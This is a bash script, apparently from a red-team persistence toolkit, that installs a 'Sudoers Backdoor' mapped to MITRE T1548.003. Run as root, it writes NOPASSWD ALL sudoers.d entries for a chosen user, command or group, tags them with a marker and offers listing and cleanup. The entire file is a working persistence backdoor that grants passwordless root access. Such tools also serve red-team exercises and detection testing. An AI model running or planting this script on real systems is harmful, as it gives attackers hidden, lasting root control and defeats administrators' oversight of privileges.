#!/bin/bash
#
# Sudoers Backdoor (T1548.003)
# Add NOPASSWD entries to /etc/sudoers.d/ for persistent privilege escalation
# Source: PANIX, TripleCross
#

if [[ $(id -u) -ne 0 ]]; then
    echo "[ERROR] You must run this script as root" >&2
    exit 1
fi

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'
MARKER="d3m0n_sudoers"
SUDOERS_DIR="/etc/sudoers.d"

echo -e "${CYAN}"
echo "  ╔═══════════════════════════════════════════════════════╗"
echo "  ║          Sudoers Backdoor (T1548.003)                 ║"
echo "  ║   NOPASSWD sudo for specified user via sudoers.d      ║"
echo "  ╚═══════════════════════════════════════════════════════╝"
echo -e "${NC}"

echo -e "  ${CYAN}[1]${NC} Add NOPASSWD ALL for a user"
echo -e "  ${CYAN}[2]${NC} Add NOPASSWD for specific command"
echo -e "  ${CYAN}[3]${NC} Add NOPASSWD for a group"
echo -e "  ${CYAN}[4]${NC} List D3m0n sudoers entries"
echo -e "  ${CYAN}[5]${NC} Cleanup"
echo ""
read -p "Choice [1-5]: " OPT

install_sudoers() {
    local ENTRY="$1"
    local FNAME="${2:-d3m0n-backdoor}"
    local FPATH="${SUDOERS_DIR}/${FNAME}"

    mkdir -p "$SUDOERS_DIR" 2>/dev/null

    echo "# ${MARKER}" > "$FPATH"
    echo "$ENTRY" >> "$FPATH"

    chmod 440 "$FPATH"

    # Validate syntax
    if visudo -c -f "$FPATH" >/dev/null 2>&1; then
        echo -e "${GREEN}[+] Sudoers entry installed: ${FPATH}${NC}"
        echo -e "${GREEN}[+] Entry: ${ENTRY}${NC}"
    else
        echo -e "${RED}[-] Syntax error detected — removing to prevent lockout${NC}"
        rm -f "$FPATH"
        exit 1
    fi
}

case "$OPT" in
    1)
        read -p "Username [$(logname 2>/dev/null || echo nobody)]: " BUSER
        BUSER="${BUSER:-$(logname 2>/dev/null || echo nobody)}"
        read -p "Filename [d3m0n-backdoor]: " FNAME
        FNAME="${FNAME:-d3m0n-backdoor}"
        install_sudoers "${BUSER} ALL=(ALL:ALL) NOPASSWD: ALL" "$FNAME"
        echo -e "${YELLOW}[*] Test: su - ${BUSER} -c 'sudo id'${NC}"
        ;;
    2)
        read -p "Username: " BUSER
        read -p "Command path (e.g. /bin/bash): " BCMD
        read -p "Filename [d3m0n-backdoor]: " FNAME
        FNAME="${FNAME:-d3m0n-backdoor}"
        install_sudoers "${BUSER} ALL=(ALL:ALL) NOPASSWD: ${BCMD}" "$FNAME"
        ;;
    3)
        read -p "Group name: " BGROUP
        read -p "Filename [d3m0n-backdoor]: " FNAME
        FNAME="${FNAME:-d3m0n-backdoor}"
        install_sudoers "%${BGROUP} ALL=(ALL:ALL) NOPASSWD: ALL" "$FNAME"
        ;;
    4)
        echo -e "${YELLOW}[*] Scanning ${SUDOERS_DIR}...${NC}"
        found=$(grep -rl "${MARKER}" "$SUDOERS_DIR" 2>/dev/null)
        if [[ -n "$found" ]]; then
            echo "$found" | while read -r f; do
                echo -e "  ${GREEN}$f:${NC}"
                grep -v "^#" "$f" | head -3
            done
        else
            echo -e "  ${YELLOW}No D3m0n sudoers entries found${NC}"
        fi
        ;;
    5)
        echo -e "${YELLOW}[*] Removing D3m0n sudoers entries...${NC}"
        grep -rl "${MARKER}" "$SUDOERS_DIR" 2>/dev/null | while read -r f; do
            echo -e "  Removing: $f"
            rm -f "$f"
        done
        echo -e "${GREEN}[+] Cleanup done${NC}"
        ;;
    *)
        echo "Invalid option"
        ;;
esac
